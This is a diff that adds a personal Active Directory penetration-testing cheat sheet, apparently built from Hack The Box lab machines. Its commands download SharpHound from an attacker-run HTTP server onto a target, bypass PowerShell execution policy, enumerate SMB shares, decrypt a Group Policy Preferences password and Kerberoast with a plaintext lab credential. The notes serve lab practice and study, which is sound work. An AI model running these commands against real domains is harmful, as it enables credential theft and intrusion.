@@ -1,0 +1,74 @@
+########################################################################################################
+#     _        _   _             ____  _               _                     ____           _        
+#    / \   ___| |_(_)_   _____  |  _ \(_)_ __ ___  ___| |_ ___  _ __ _   _  |  _ \ __ _ ___| |_ __ _ 
+#   / _ \ / __| __| \ \ / / _ \ | | | | | '__/ _ \/ __| __/ _ \| '__| | | | | |_) / _` / __| __/ _` |
+#  / ___ \ (__| |_| |\ V /  __/ | |_| | | | |  __/ (__| || (_) | |  | |_| | |  __/ (_| \__ \ || (_| |
+# /_/   \_\___|\__|_| \_/ \___| |____/|_|_|  \___|\___|\__\___/|_|   \__, | |_|   \__,_|___/\__\__,_|
+#                                                                    |___/                           
+########################################################################################################
+
+
+
+
+
+
+{{{ ### 1. Recon 
+
+
+
+
+
+
+
+{{{ ### Bloodhound ###
+# bloodhound
+cp /usr/share/sharphound/SharpHound.ps1 .
+python -m http.server
+invoke-webrequest -uri http://10.10.14.155:8000/SharpHound.ps1 -outfile sharphound.ps1
+powershell -ep bypass
+import-module .\sharphound.ps1
+get-help invoke-bloodhound
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\svc-alfresco\Documents -OutputPrefix "htb.local-audit"
+
+# analyze with bloodhound
+
+
+}}}
+
+
+{{{ ### SMB ###
+
+# smbclient
+smbclient -L //<IP>
+
+smbclient //10.129.165.65/Users --user=active.htb/administrator
+
+
+# smbmap
+smbmap -H <IP> 
+
+
+}}}
+
+
+{{{ ### LDAP
+
+
+
+
+}}}
+
+}}}
+
+
+
+# GPP Hash
+policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\preferences\groups\Groups.xml
+
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+
+# Kerberoasting
+# obtain password hash from a service principle name (SPN)
+/usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
+
+
